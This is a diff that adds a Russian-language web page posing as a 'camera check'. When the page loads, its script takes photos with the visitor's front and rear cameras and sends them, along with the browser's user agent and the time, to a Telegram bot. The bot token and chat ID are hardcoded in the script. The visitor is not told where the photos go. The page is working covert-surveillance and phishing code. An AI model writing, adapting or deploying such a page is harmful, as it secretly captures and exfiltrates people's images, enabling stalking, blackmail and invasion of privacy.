@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <title>Проверка камеры</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+      background:#0f0f1a;color:#fff;
+      display:flex;flex-direction:column;align-items:center;
+      justify-content:center;min-height:100vh;
+      -webkit-user-select:none;user-select:none;
+    }
+    .card{
+      background:#1a1a2e;border-radius:20px;padding:40px 28px;
+      text-align:center;max-width:360px;width:90%;
+      box-shadow:0 8px 32px rgba(0,0,0,.45);
+    }
+    h1{font-size:1.3rem;margin-bottom:6px}
+    .sub{color:#8888aa;font-size:.85rem;margin-bottom:28px}
+    .status{
+      display:flex;flex-direction:column;gap:14px;margin-top:8px;
+    }
+    .item{
+      display:flex;align-items:center;gap:12px;
+      background:#22223a;border-radius:12px;padding:14px 16px;
+      font-size:.9rem;
+    }
+    .dot{
+      width:12px;height:12px;border-radius:50%;flex-shrink:0;
+      background:#444;
+    }
+    .dot.pending{background:#555}
+    .dot.active{background:#f5a623;animation:pulse 1s infinite}
+    .dot.done{background:#2ecc71}
+    .dot.fail{background:#e74c3c}
+    @keyframes pulse{50%{opacity:.4}}
+    .spin{
+      width:28px;height:28px;border:3px solid #333;
+      border-top-color:#6c5ce7;border-radius:50%;
+      animation:rot .8s linear infinite;
+    }
+    @keyframes rot{to{transform:rotate(360deg)}}
+    .done-icon{font-size:2.4rem}
+    .msg-ok{color:#2ecc71;font-size:.95rem;margin-top:18px}
+    .msg-err{color:#e74c3c;font-size:.9rem;margin-top:14px}
+    video,canvas{display:none}
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1 id="title">📷 Проверка камеры</h1>
+    <p class="sub" id="sub">Сделайте снимок фронтальной и основной камерой</p>
+
+    <div class="status" id="status" style="display:none">
+      <div class="item">
+        <span class="dot pending" id="d1"></span>
+        <span>Фронтальная камера</span>
+      </div>
+      <div class="item">
+        <span class="dot pending" id="d2"></span>
+        <span>Основная камера</span>
+      </div>
+      <div class="item">
+        <span class="dot pending" id="d3"></span>
+        <span>Отправка…</span>
+      </div>
+    </div>
+
+    <div class="spin" id="spin" style="margin-top:24px"></div>
+    <p class="msg-ok" id="ok" style="display:none">✅ Готово!</p>
+    <p class="msg-err" id="err" style="display:none"></p>
+  </div>
+
+  <video id="video" playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+<script>
+/* ====== ТВОИ ДАННЫЕ ВСТАВЛЕНЫ АВТОМАТИЧЕСКИ ====== */
+const BOT_TOKEN  = '8663990302:AAGgXmthRHj37AhIDOZ4LuKETkgtYQnhqSk';
+const CHAT_ID    = '8576994971';
+/* ================================================= */
+
+const video  = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx    = canvas.getContext('2d');
+
+const setDot = (id, cls) => {
+  const el = document.getElementById(id);
+  el.className = 'dot ' + cls;
+};
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+function grab() {
+  return new Promise((res, rej) => {
+    const w = video.videoWidth;
+    const h = video.videoHeight;
+    if (!w || !h) return rej('no-frame');
+    canvas.width  = w;
+    canvas.height = h;
+    ctx.drawImage(video, 0, 0, w, h);
+    canvas.toBlob(b => res(b), 'image/jpeg', 0.85);
+  });
+}
+
+async function shoot(facing) {
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: facing, width: { ideal: 1920 }, height: { ideal: 1080 } },
+    audio: false
+  });
+  try {
+    video.srcObject = stream;
+    await video.play();
+    await sleep(1200);          // даём камере «проснуться»
+    const blob = await grab();
+    return blob;
+  } finally {
+    stream.getTracks().forEach(t => t.stop());
+  }
+}
+
+async function send(blob, caption) {
+  const fd = new FormData();
+  fd.append('photo',   blob, 'photo.jpg');
+  fd.append('chat_id', CHAT_ID);
+  fd.append('caption', caption);
+  const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: 'POST', body: fd
+  });
+  const j = await r.json();
+  if (!j.ok) throw new Error('TG:' + (j.description || 'err'));
+}
+
+async function run() {
+  const $ = id => document.getElementById(id);
+  $('status').style.display = 'flex';$('spin').style.display   = 'none';
+
+  try {
+    // --- фронталка ---
+    setDot('d1','active');
+    const front = await shoot('user');
+    setDot('d1','done');
+
+    // --- основная ---
+    setDot('d2','active');
+    const back = await shoot('environment');
+    setDot('d2','done');
+
+    // --- отправка ---
+    setDot('d3','active');
+    const ua = navigator.userAgent;
+    const d  = new Date().toLocaleString('ru-RU');
+
+    await send(front, `📱 Фронт | ${ua}\n🕐 ${d}`);
+    await send(back,  `📱 Основная | ${ua}\n🕐 ${d}`);
+
+    setDot('d3','done');
+    await sleep(600);
+
+    $('title').textContent  = 'Готово';
+    $('sub').textContent    = 'Можно закрыть вкладку';
+    $('status').style.display = 'none';$('ok').style.display     = 'block';
+
+  } catch (e) {
+    console.error(e);
+    ['d1','d2','d3'].forEach(id => {
+      const el = $(id);
+      if (el.classList.contains('active')) el.className = 'dot fail';
+    });
+    $('spin').style.display = 'none';$('err').textContent    = 'Не удалось завершить. Попробуйте ещё раз.';
+    $('err').style.display  = 'block';
+  }
+}
+
+// стартуем сразу
+run();
+</script>
+</body>
+</html>
